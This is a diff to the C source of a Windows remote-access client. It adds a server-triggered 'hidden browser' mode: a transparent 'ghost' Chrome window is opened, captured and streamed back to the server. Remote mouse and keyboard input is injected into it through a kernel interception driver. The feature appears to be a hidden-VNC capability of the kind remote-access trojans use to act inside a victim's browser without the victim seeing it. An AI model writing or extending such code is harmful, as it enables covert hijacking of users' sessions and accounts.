@@ -11,6 +11,7 @@
 #include "remote_log.h"
 #include "remote_desktop.h"
 #include "remote_input_interception.h"
+#include "remote_hidden_browser.h"
 #include <ShlObj.h>
 #include <Shellapi.h>
 #include <PowrProf.h>
@@ -51,6 +52,8 @@ static volatile long g_client_stop = 0;
 static volatile long g_request_reconnect = 0;
 /* 0=User (SendInput/mouse_event/keybd_event), 1=Kernel (interception driver). Set by DoSetRemoteControlMode. */
 static volatile int g_remote_control_mode = 0;
+/* 1 when hidden browser stream is active; mouse/keyboard events target ghost window. */
+static volatile int g_hidden_browser_streaming = 0;
 /* Throttle input-path log for mouse move to avoid spam. */
 static DWORD g_last_mouse_path_log_tick = 0;
 
@@ -79,6 +82,7 @@ void remote_client_stop(void) {
 }
 
 void remote_client_run(void) {
+    remote_log("[thread] remote_client_run started");
     remote_config_t config;
     if (!remote_config_load(&config) || !config.valid) {
         remote_log("config load failed; check config.json next to process exe");
@@ -194,9 +198,13 @@ void remote_client_run(void) {
         /* Message loop: read frames (4-byte length + payload), dispatch by subtype. */
         {
             unsigned char header[4];
-            /* 128KB buffer: FileTransferChunk from server can be ~66KB (65535 data + envelope). */
-            unsigned char payload_buf[128 * 1024];
-            const unsigned int max_payload = (unsigned int)sizeof(payload_buf);
+            /* 128KB buffer on heap (avoid stack overflow). FileTransferChunk can be ~66KB. */
+            const unsigned int max_payload = 128 * 1024;
+            unsigned char* payload_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, max_payload);
+            if (!payload_buf) {
+                remote_log("[loop] heap alloc for payload failed");
+                break;
+            }
             while (InterlockedCompareExchange(&g_client_stop, 1, 1) != 1) {
                 if (InterlockedCompareExchange(&g_request_reconnect, 1, 1) == 1) {
                     remote_log("[loop] reconnect requested; breaking to reconnect");
@@ -288,6 +296,90 @@ void remote_client_run(void) {
                             }
                         }
                     }
+                    else if (subtype == REMOTE_SUBTYPE_DoStartHiddenBrowser) {
+                        remote_log("[loop] handling DoStartHiddenBrowser");
+                        const unsigned char* body = dispatch_buf + consumed;
+                        unsigned int body_len = dispatch_len - consumed;
+                        int quality = 75, dummy_disp = 0, dummy_new = 0;
+                        remote_proto_decode_get_desktop(body, body_len, &quality, &dummy_disp, &dummy_new);
+                        remote_config_t cfg;
+                        int alpha = -1;
+                        if (remote_config_load(&cfg) && cfg.valid) {
+                            int pct = cfg.ghost_transparency;
+                            if (pct >= 0 && pct <= 100) {
+                                int opaque = 100 - pct;
+                                alpha = (int)(255.0 * (opaque / 100.0) + 0.5);
+                                if (alpha < 0) alpha = 0;
+                                if (alpha > 255) alpha = 255;
+                            }
+                        }
+                        if (remote_hidden_browser_start("Default", "chrome://newtab", alpha)) {
+                            g_hidden_browser_streaming = 1;
+                            remote_log("[loop] hidden browser started, streaming ON");
+                        } else {
+                            remote_log("[loop] hidden browser start failed");
+                        }
+                    }
+                    else if (subtype == REMOTE_SUBTYPE_DoStopHiddenBrowser) {
+                        g_hidden_browser_streaming = 0;
+                        remote_input_interception_shutdown();
+                        remote_log("[loop] DoStopHiddenBrowser: streaming OFF, interception shutdown");
+                    }
+                    else if (subtype == REMOTE_SUBTYPE_DoCloseHiddenBrowser) {
+                        g_hidden_browser_streaming = 0;
+                        int close_result = remote_hidden_browser_close();
+                        const char* msg = (close_result == 1) ? "Ghost window closed." : (close_result == 2) ? "No ghost window was open." : "Failed to close ghost window.";
+                        unsigned char body_buf[128];
+                        unsigned int body_len = remote_proto_encode_close_hidden_browser_result(close_result, msg, body_buf, sizeof(body_buf));
+                        if (body_len > 0) {
+                            unsigned char full_buf[140];
+                            unsigned int full_len = remote_proto_prepend_imessage(full_buf, sizeof(full_buf), REMOTE_SUBTYPE_CloseHiddenBrowserResult, body_buf, body_len);
+                            if (full_len > 0) {
+                                unsigned char frame_buf[148];
+                                unsigned int frame_len = remote_proto_write_frame(full_buf, full_len, frame_buf, sizeof(frame_buf));
+                                if (frame_len > 0)
+                                    remote_transport_send(transport, frame_buf, frame_len);
+                            }
+                        }
+                        remote_log("[loop] DoCloseHiddenBrowser: result=%d (%s)", close_result, msg);
+                    }
+                    else if (subtype == REMOTE_SUBTYPE_GetHiddenBrowser) {
+                        if (!g_hidden_browser_streaming) break;
+                        const unsigned char* body = dispatch_buf + consumed;
+                        unsigned int body_len = dispatch_len - consumed;
+                        int quality = 75, dummy_disp = 0, dummy_new = 0;
+                        remote_proto_decode_get_desktop(body, body_len, &quality, &dummy_disp, &dummy_new);
+                        unsigned char cap_buf[256 * 1024];
+                        unsigned int cap_len = remote_hidden_browser_capture_frame(cap_buf, sizeof(cap_buf), quality);
+                        if (cap_len >= 4) {
+                            unsigned int w = 0, h = 0;
+                            remote_hidden_browser_get_bounds(&w, &h);
+                            if (w == 0 || h == 0) { w = 1280; h = 720; }
+                            unsigned int body_max = cap_len + 128;
+                            unsigned char* body_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, body_max);
+                            if (body_buf) {
+                                unsigned int resp_len = remote_proto_encode_get_desktop_response(cap_buf, cap_len, quality, 0, (int)w, (int)h, body_buf, body_max);
+                                if (resp_len > 0) {
+                                    unsigned int full_max = resp_len + 8;
+                                    unsigned char* full_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, full_max);
+                                    if (full_buf) {
+                                        unsigned int full_len = remote_proto_prepend_imessage(full_buf, full_max, REMOTE_SUBTYPE_GetHiddenBrowserResponse, body_buf, resp_len);
+                                        HeapFree(GetProcessHeap(), 0, body_buf);
+                                        if (full_len > 0) {
+                                            unsigned int frame_max = 4 + full_len;
+                                            unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, frame_max);
+                                            if (frame_buf) {
+                                                unsigned int frame_len = remote_proto_write_frame(full_buf, full_len, frame_buf, frame_max);
+                                                remote_transport_send(transport, frame_buf, frame_len);
+                                                HeapFree(GetProcessHeap(), 0, frame_buf);
+                                            }
+                                        }
+                                        HeapFree(GetProcessHeap(), 0, full_buf);
+                                    } else HeapFree(GetProcessHeap(), 0, body_buf);
+                                } else HeapFree(GetProcessHeap(), 0, body_buf);
+                            }
+                        }
+                    }
                     else if (subtype == REMOTE_SUBTYPE_DoSetRemoteControlMode) {
                         unsigned int mode = 0;
                         if (remote_proto_decode_do_set_remote_control_mode(dispatch_buf + consumed, dispatch_len - consumed, &mode)) {
@@ -306,13 +398,29 @@ void remote_client_run(void) {
                         if (remote_proto_decode_do_mouse_event(dispatch_buf + consumed, dispatch_len - consumed, &act, &is_down, &mx, &my, &mon, &evt_mode)) {
                             int mon_x = 0, mon_y = 0;
                             unsigned int mon_w = 0, mon_h = 0;
-                            remote_desktop_get_monitor_bounds(mon, &mon_x, &mon_y, &mon_w, &mon_h);
-                            int px = mon_x + mx;
-                            int py = mon_y + my;
+                            int px, py;
+                            if (g_hidden_browser_streaming && remote_hidden_browser_is_active()) {
+                                HWND gh = (HWND)remote_hidden_browser_get_hwnd();
+                                if (gh) {
+                                    RECT gr;
+                                    if (GetWindowRect(gh, &gr)) {
+                                        px = gr.left + mx;
+                                        py = gr.top + my;
+                                        mon_x = gr.left; mon_y = gr.top;
+                                        mon_w = (unsigned int)(gr.right - gr.left);
+                                        mon_h = (unsigned int)(gr.bottom - gr.top);
+                                    } else { px = mx; py = my; }
+                                } else { px = mx; py = my; }
+                            } else {
+                                remote_desktop_get_monitor_bounds(mon, &mon_x, &mon_y, &mon_w, &mon_h);
+                                px = mon_x + mx;
+                                py = mon_y + my;
+                            }
                             remote_log("[loop] DoMouseEvent decoded: act=%u is_down=%d mx=%d my=%d mon=%d -> px=%d py=%d (mon_bounds x=%d y=%d w=%u h=%u)",
                                 act, is_down, mx, my, mon, px, py, mon_x, mon_y, mon_w, mon_h);
 
                             int effective_mode = (evt_mode >= 0) ? evt_mode : (int)g_remote_control_mode;
+                            if (g_hidden_browser_streaming) effective_mode = 1;
                             {
                                 int use_kernel = (effective_mode == 1 && remote_input_interception_is_ready());
                                 DWORD now = GetTickCount();
@@ -320,6 +428,14 @@ void remote_client_run(void) {
                                 if (do_log) {
                                     g_last_mouse_path_log_tick = now;
                                     remote_log("[loop] DoMouseEvent -> input via %s", use_kernel ? "Kernel (interception driver)" : "User (SetCursorPos/mouse_event)");
+                                }
+                            }
+                            if (g_hidden_browser_streaming && remote_hidden_browser_is_active()) {
+                                remote_hidden_browser_prepare_for_input();
+                                /* Only bring to foreground + sleep for clicks/scroll; skip for move to avoid lag */
+                                if (act != 4) {
+                                    HWND gh = (HWND)remote_hidden_browser_get_hwnd();
+                                    if (gh) { SetForegroundWindow(gh); Sleep(8); }
                                 }
                             }
                             if (effective_mode == 1 && remote_input_interception_is_ready()) {
@@ -349,6 +465,10 @@ void remote_client_run(void) {
                                 }
                                 if (scope.to_close) restore_input_desktop(&scope);
                             }
+                            if (g_hidden_browser_streaming && remote_hidden_browser_is_active()) {
+                                if (act != 4) Sleep(5);
+                                remote_hidden_browser_release_after_input();
+                            }
                         } else {
                             remote_log("[loop] DoMouseEvent decode failed (body_len=%u)", (unsigned)(dispatch_len - consumed));
                             remote_log_hex("DoMouseEvent body", (const unsigned char*)(dispatch_buf + consumed), dispatch_len - consumed);
@@ -361,6 +481,14 @@ void remote_client_run(void) {
                         int key_down = 0, evt_mode = -1;
                         if (remote_proto_decode_do_keyboard_event(dispatch_buf + consumed, dispatch_len - consumed, &key, &key_down, &evt_mode)) {
                             int effective_mode = (evt_mode >= 0) ? evt_mode : (int)g_remote_control_mode;
+                            if (g_hidden_browser_streaming) effective_mode = 1;
+                            if (g_hidden_browser_streaming && remote_hidden_browser_is_active()) {
+                                remote_hidden_browser_prepare_for_input();
+                                {
+                                    HWND gh = (HWND)remote_hidden_browser_get_hwnd();
+                                    if (gh) { SetForegroundWindow(gh); Sleep(8); }
+                                }
+                            }
                             remote_log("[loop] DoKeyboardEvent decoded: key=%u (0x%02X) key_down=%d mode=%d", (unsigned)key, (unsigned)key, key_down, effective_mode);
                             if (effective_mode == 1 && remote_input_interception_is_ready()) {
                                 remote_log("[loop] DoKeyboardEvent -> input via Kernel (interception driver)");
@@ -371,6 +499,10 @@ void remote_client_run(void) {
                                 input_desktop_scope_t scope = switch_to_input_desktop();
                                 keybd_event((BYTE)key, 0, key_down ? 0 : KEYEVENTF_KEYUP, 0);
                                 if (scope.to_close) restore_input_desktop(&scope);
+                            }
+                            if (g_hidden_browser_streaming && remote_hidden_browser_is_active()) {
+                                Sleep(5);
+                                remote_hidden_browser_release_after_input();
                             }
                         } else {
                             remote_log("[loop] DoKeyboardEvent decode failed (body_len=%u)", (unsigned)(dispatch_len - consumed));
@@ -991,6 +1123,7 @@ void remote_client_run(void) {
                     remote_log("[loop] payload still not IMessage after prepend? first byte=0x%02X, len=%u", dispatch_len > 0 ? dispatch_buf[0] : 0, dispatch_len);
                 }
             }
+            HeapFree(GetProcessHeap(), 0, payload_buf);
         }
         upload_close();
         remote_transport_close(transport);
